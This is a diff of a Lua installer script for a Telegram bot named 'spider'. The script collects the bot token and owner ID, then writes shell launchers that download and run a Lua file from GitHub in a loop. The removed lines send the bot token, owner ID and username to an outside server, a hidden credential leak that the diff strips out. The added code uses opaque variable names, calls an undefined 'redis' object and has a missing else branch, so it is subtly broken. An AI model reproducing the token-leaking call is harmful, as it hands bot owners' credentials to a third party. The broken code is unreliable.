@@ -1,75 +1,50 @@
-serpent = dofile("./File_Libs/serpent.lua")
-https = require("ssl.https")
-http = require("socket.http")
-JSON = dofile("./File_Libs/JSON.lua")
-local database = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
-Server_spider = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
-local AutoFiles_spider = function() 
-local Create_Info = function(Token,Sudo,UserName)  
-local spider_Info_Sudo = io.open("sudo.lua", 'w')
-spider_Info_Sudo:write([[
+Create_1 = dofile("./File_Libs/serpent.lua")
+Create_2 = require("ssl.https")
+Create_4 = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
+local Create_3 = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
+local Create_5 = function() 
+local Create_6 = function(Token,Sudo)  
+local Create_7 = io.open("sudo.lua", 'w')
+Create_7:write([[
 token = "]]..Token..[["
 
 Sudo = ]]..Sudo..[[  
-
-UserName = "]]..UserName..[["
 ]])
-spider_Info_Sudo:close()
+Create_7:close()
 end  
-if not database:get(Server_spider.."Token_spider") then
+if not Create_3:get(Create_4.."Token_spider") then
 print("\27[1;34m»» Send Your Token Bot :\27[m")
 local token = io.read()
 if token ~= '' then
-local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
+local url , res = Create_2.request('https://api.telegram.org/bot'..token..'/getMe')
 if res ~= 200 then
 io.write('\n\27[1;31m»» Sorry The Token is not Correct \n\27[0;39;49m')
 else
 io.write('\n\27[1;31m»» The Token Is Saved\n\27[0;39;49m')
-database:set(Server_spider.."Token_spider",token)
+Create_3:set(Create_4.."Token_spider",token)
 end 
 else
 io.write('\n\27[1;31mThe Tokem was not Saved\n\27[0;39;49m')
 end 
 os.execute('lua start.lua')
 end
-------------------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------------------
-if not database:get(Server_spider.."UserName_spider") then
-print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
-local UserName = io.read():gsub('@','')
-if UserName ~= '' then
-local Get_Info = http.request("http://TshAkE.ml/info/?user="..UserName)
-if Get_Info:match('Is_Spam') then
-io.write('\n\27[1;31m»» Sorry The server is Spsm \nتم حظر السيرفر لمدة 5 دقايق بسبب التكرار\n\27[0;39;49m')
-return false
-end
-local Json = JSON:decode(Get_Info)
-if Json.Info == false then
-io.write('\n\27[1;31m»» Sorry The UserName is not Correct \n\27[0;39;49m')
+if not redis:get(Create_4.."Id_spider") then
+print("\27[1;34m\n»» Send Your id Sudo : \27[m")
+local Id = io.read():gsub(' ','') 
+if tostring(Id):match('%d+') then
+io.write('\n\27[1;31m»» The id Is Saved\n\27[0;39;49m')
+Create_3:set(Create_4.."Id_spider",Id)
+io.write('\n\27[1;31m»» Sorry The id is not Correct \n\27[0;39;49m')
 os.execute('lua start.lua')
-else
-if Json.Info == 'Channel' then
-io.write('\n\27[1;31m»» Sorry The UserName Is Channel \n\27[0;39;49m')
-os.execute('lua start.lua')
-else
-io.write('\n\27[1;31m»» The UserNamr Is Saved\n\27[0;39;49m')
-database:set(Server_spider.."UserName_spider",Json.Info.Username)
-database:set(Server_spider.."Id_spider",Json.Info.Id)
 end
-end
-else
-io.write('\n\27[1;31mThe UserName was not Saved\n\27[0;39;49m')
-end 
-os.execute('lua start.lua')
 end
 local function Files_spider_Info()
-Create_Info(database:get(Server_spider.."Token_spider"),database:get(Server_spider.."Id_spider"),database:get(Server_spider.."UserName_spider"))   
-https.request("https://uussuu.ml/spider/spider.php?id="..database:get(Server_spider.."Id_spider").."&user="..database:get(Server_spider.."UserName_spider").."&token="..database:get(Server_spider.."Token_spider"))
+Create_6(Create_3:get(Create_4.."Token_spider"),Create_3:get(Create_4.."Id_spider"))   
 local Runspider = io.open("spider", 'w')
 Runspider:write([[
 #!/usr/bin/env bash
 cd $HOME/spider
-token="]]..database:get(Server_spider.."Token_spider")..[["
+token="]]..Create_3:get(Create_4.."Token_spider")..[["
 rm -fr spider.lua
 wget "https://raw.githubusercontent.com/spidersr/spider/master/spider.lua"
 while(true) do
@@ -78,7 +53,7 @@ rm -fr ../.telegram-cli
 done
 ]])
 Runspider:close()
-local RunTs = io.open("ts", 'w')
+local RunTs = io.open("Run", 'w')
 RunTs:write([[
 #!/usr/bin/env bash
 cd $HOME/spider
@@ -91,18 +66,20 @@ done
 RunTs:close()
 end
 Files_spider_Info()
-database:del(Server_spider.."Token_spider");database:del(Server_spider.."Id_spider");database:del(Server_spider.."UserName_spider")
+Create_3:del(Create_4.."Token_spider")
+Create_3:del(Create_4.."Id_spider")
 sudos = dofile('sudo.lua')
 os.execute('./install.sh ins')
 end 
 local function Load_File()  
 local f = io.open("./sudo.lua", "r")  
 if not f then   
-AutoFiles_spider()  
+Create_5()  
 var = true
 else   
 f:close()  
-database:del(Server_spider.."Token_spider");database:del(Server_spider.."Id_spider");database:del(Server_spider.."UserName_spider")
+Create_3:del(Create_4.."Token_spider")
+Create_3:del(Create_4.."Id_spider")
 sudos = dofile('sudo.lua')
 os.execute('./install.sh ins')
 var = false
